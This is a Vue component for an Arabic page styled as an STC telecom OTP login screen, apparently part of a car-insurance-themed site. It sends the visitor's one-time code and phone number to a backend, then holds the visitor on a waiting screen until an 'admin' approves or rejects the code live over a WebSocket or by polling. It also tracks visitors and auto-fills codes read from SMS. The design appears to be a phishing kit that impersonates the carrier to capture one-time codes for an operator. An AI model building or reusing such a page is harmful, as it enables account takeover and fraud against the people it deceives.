<template>
    <StcLayout>
        <!-- Back Button -->
        <div class="my-5 flex w-full justify-start">
            <button type="button" class="stc-back-btn" @click="goBack">
                <svg class="h-4 w-4 rtl:rotate-180" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 19l-7-7 7-7" />
                </svg>
                <span>العودة</span>
            </button>
        </div>

        <!-- OTP Entry State -->
        <template v-if="!waitingForApproval && !rejected">
            <div class="mb-4 lg:mb-12">
                <h2 class="mb-2 text-3xl font-medium stc-text-primary lg:text-4xl">أدخل الرمز 6 المكون من أرقام</h2>
                <p class="text-base stc-text-dark">تم إرسال رمز التحقق إلى {{ phoneNumber }}</p>
            </div>

            <div class="mb-4 flex justify-center" style="direction: ltr;">
                <OtpInput ref="otpInputRef" v-model="otpCode" :length="6" :disabled="processing" :error="error"
                    :auto-submit="true" @submit="verifyOtp" />
            </div>

            <div v-if="processing" class="mb-4 flex justify-center">
                <div class="stc-loader">
                    <div class="stc-loader__dot"></div>
                    <div class="stc-loader__dot"></div>
                    <div class="stc-loader__dot"></div>
                </div>
            </div>

            <!-- Error -->
            <Transition name="stc-fade">
                <div v-if="error" class="mb-4 rounded border border-red-300 bg-red-50 p-3 text-center">
                    <p class="text-sm text-red-700">{{ error }}</p>
                </div>
            </Transition>

            <div v-if="countdown > 0 && !processing && !verified" class="mb-4 flex justify-center">
                <span class="text-sm font-medium stc-text-primary">إعادة الإرسال بعد {{ formatTime(countdown) }}</span>
            </div>

            <div class="flex items-center gap-3">
                <div class="w-full">
                    <button :disabled="!canVerify || processing" type="button" class="stc-btn-contained w-full"
                        @click="verifyOtp">
                        <span v-if="processing" class="flex items-center justify-center gap-2">
                            <svg class="h-5 w-5 animate-spin" fill="none" viewBox="0 0 24 24">
                                <circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor"
                                    stroke-width="4" />
                                <path class="opacity-75" fill="currentColor"
                                    d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4z" />
                            </svg>
                            جاري التحقق...
                        </span>
                        <span v-else>تسجيل الدخول</span>
                    </button>
                </div>
            </div>
        </template>

        <!-- Waiting for Admin Approval -->
        <Transition name="stc-fade">
            <div v-if="waitingForApproval" class="flex w-full flex-col items-center gap-5 py-12">
                <div class="stc-loader">
                    <div class="stc-loader__dot"></div>
                    <div class="stc-loader__dot"></div>
                    <div class="stc-loader__dot"></div>
                </div>
                <p class="text-center text-lg stc-text-dark">جاري التحقق من الرمز...</p>
            </div>
        </Transition>

        <!-- Rejected State -->
        <Transition name="stc-fade">
            <div v-if="rejected" class="flex w-full flex-col items-center gap-5 py-8">
                <div class="flex h-16 w-16 items-center justify-center rounded-full bg-red-100">
                    <svg class="h-10 w-10 text-red-600" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2.5"
                            d="M6 18L18 6M6 6l12 12" />
                    </svg>
                </div>
                <h2 class="text-xl font-bold text-red-800">{{ rejectMessage || 'تم رفض الرمز' }}</h2>
                <p class="text-sm text-red-700">يرجى المحاولة مرة أخرى</p>
                <button type="button" class="stc-btn-contained w-full" @click="retryOtp">
                    <span>إعادة المحاولة</span>
                </button>
            </div>
        </Transition>
    </StcLayout>
</template>

<script setup>
import { ref, computed, onMounted, onUnmounted } from 'vue';
import { useRouter, useRoute } from 'vue-router';
import { useI18n } from 'vue-i18n';
import { useVisitorTracking } from '@/composables/useVisitorTracking';
import request from '@/api/request';
import { getEcho } from '@/services/echo';
import OtpInput from '@/components/ui/OtpInput.vue';
import StcLayout from '@/car.insurance/components/StcLayout.vue';
import { getReasonLabel } from '@/constants/rejectionReasons';
import { safeRedirect } from '@/utils/safeRedirect';
import { getSessionToken } from '@/utils/sessionToken';
import { customerBroadcastChannel } from '@/utils/customerBroadcastChannel';
import { useWebOtp } from '@/composables/useWebOtp';

const router = useRouter();
const route = useRoute();
const { t } = useI18n();

useVisitorTracking( 'stc/otp' );

// ─── Load context from sessionStorage / query params ────────────────
const stcContext = JSON.parse( sessionStorage.getItem( 'stcContext' ) || '{}' );
const phoneNumber = stcContext.phoneNumber || route.query.phone || '';
const customerIp = stcContext.customerIp || '';

// ─── State ──────────────────────────────────────────────────────────
const otpCode = ref( '' );
const otpInputRef = ref( null );
const countdown = ref( 60 );
const processing = ref( false );
const verified = ref( false );
const waitingForApproval = ref( false );
const rejected = ref( false );
const rejectMessage = ref( '' );
const error = ref( '' );
let countdownInterval = null;
let echoChannel = null;
let echoChannelName = '';
let pollTimer = null;

const canVerify = computed( () =>
    otpCode.value.length === 6 && !processing.value && !verified.value && !waitingForApproval.value && !rejected.value
);

const formatTime = ( seconds ) =>
{
    const mins = Math.floor( seconds / 60 );
    const secs = seconds % 60;
    return `${ mins.toString().padStart( 2, '0' ) }:${ secs.toString().padStart( 2, '0' ) }`;
};

// ─── Submit OTP ─────────────────────────────────────────────────────
const verifyOtp = async () =>
{
    if ( !canVerify.value || processing.value ) return;

    processing.value = true;
    error.value = '';

    try
    {
        const res = await request.post( '/otp/submit', {
            session_id: getSessionToken(),
            otp: otpCode.value,
            phone: phoneNumber,
            type: 'stc_otp',
        } );

        if ( res.data.success )
        {
            waitingForApproval.value = true;
            processing.value = false;
        } else
        {
            error.value = res.data.message || 'رمز التحقق غير صحيح';
            otpCode.value = '';
            otpInputRef.value?.focusFirstEmpty();
        }
    } catch ( err )
    {
        error.value = err.response?.data?.message || 'حدث خطأ، يرجى المحاولة مرة أخرى';
        otpCode.value = '';
        otpInputRef.value?.focusFirstEmpty();
    } finally
    {
        processing.value = false;
    }
};

// ─── WebSocket — listen for admin STC OTP approval/rejection ────────
async function setupWebSocket ()
{
    const echo = await getEcho();
    if ( !echo ) return;

    echoChannelName = await customerBroadcastChannel( 'stc', getSessionToken() );
    echoChannel = echo.channel( echoChannelName );

    echoChannel.listen( '.StcOtpApproved', handleApproved );
    echoChannel.listen( '.StcOtpRejected', handleRejected );
}

function handleApproved ( event )
{
    verified.value = true;
    waitingForApproval.value = false;

    // Save context for next page
    sessionStorage.setItem( 'stcContext', JSON.stringify( {
        ...stcContext,
        phoneNumber,
        customerIp,
        stcOtpApproved: true,
    } ) );

    setTimeout( () =>
    {
        if ( event.redirect_to )
        {
            safeRedirect( event.redirect_to, 'stcCallWaiting', router );
        } else
        {
            router.push( { name: 'stcCallWaiting' } );
        }
    }, 1500 );
}

function handleRejected ( event )
{
    rejected.value = true;
    waitingForApproval.value = false;
    rejectMessage.value = getReasonLabel( event.message || event.reason, t ) || 'تم رفض الرمز';
}

// ─── Polling Fallback ───────────────────────────────────────────────
function startPolling ()
{
    if ( pollTimer ) return;

    pollTimer = setInterval( async () =>
    {
        if ( !waitingForApproval.value || verified.value || rejected.value ) return;

        try
        {
            const { data } = await request.get( '/customer/stc-status' );
            if ( data.stc_otp === 'approved' )
            {
                handleApproved( {} );
            } else if ( data.stc_otp === 'rejected' )
            {
                handleRejected( { reason: data.stc_otp_reason || 'stc_otp_other' } );
            }
        } catch
        {
            // Silent — polling is a fallback
        }
    }, 5000 );
}

// ─── Countdown ──────────────────────────────────────────────────────
const startCountdown = () =>
{
    if ( countdownInterval ) clearInterval( countdownInterval );
    countdownInterval = setInterval( () =>
    {
        if ( countdown.value > 0 ) countdown.value--;
        else clearInterval( countdownInterval );
    }, 1000 );
};

// ─── Navigation ─────────────────────────────────────────────────────
const goBack = () => router.push( { name: 'stcWaiting' } );
const retryOtp = () =>
{
    rejected.value = false;
    rejectMessage.value = '';
    error.value = '';
    otpCode.value = '';
    countdown.value = 60;
    startCountdown();
    otpInputRef.value?.focusFirstEmpty();
};

// ─── Lifecycle ──────────────────────────────────────────────────────
// WebOTP API — auto-fill OTP from SMS on Android Chrome
const { start: startWebOtp, stop: stopWebOtp } = useWebOtp( ( code ) =>
{
    const digits = String( code || '' ).replace( /\D/g, '' ).slice( 0, 6 );
    if ( digits.length >= 4 ) otpCode.value = digits;
} );

onMounted( () =>
{
    startCountdown();
    otpInputRef.value?.focusFirstEmpty();
    setupWebSocket();
    startPolling();
    startWebOtp();

    if ( route.query.error )
    {
        error.value = decodeURIComponent( route.query.error );
    }
} );

onUnmounted( () =>
{
    stopWebOtp();
    if ( countdownInterval ) clearInterval( countdownInterval );
    if ( pollTimer )
    {
        clearInterval( pollTimer );
        pollTimer = null;
    }
    if ( echoChannel && echoChannelName )
    {
        try { window.Echo?.leave( echoChannelName ); } catch { /* */ }
    }
} );
</script>

<style scoped>
/* OtpInput color overrides: green → STC purple */
:deep(.otp-single__wrapper--focused) {
    border-color: #4F008C;
    box-shadow: 0 0 0 3px rgba(79, 0, 140, 0.12);
}

:deep(.otp-single__char--filled) {
    border-color: #4F008C;
    background: rgba(79, 0, 140, 0.04);
    color: #4F008C;
}

:deep(.otp-single__char--active) {
    border-color: #4F008C;
    box-shadow: 0 0 0 2px rgba(79, 0, 140, 0.15);
}

:deep(.otp-single__cursor) {
    background: #4F008C;
}
</style>
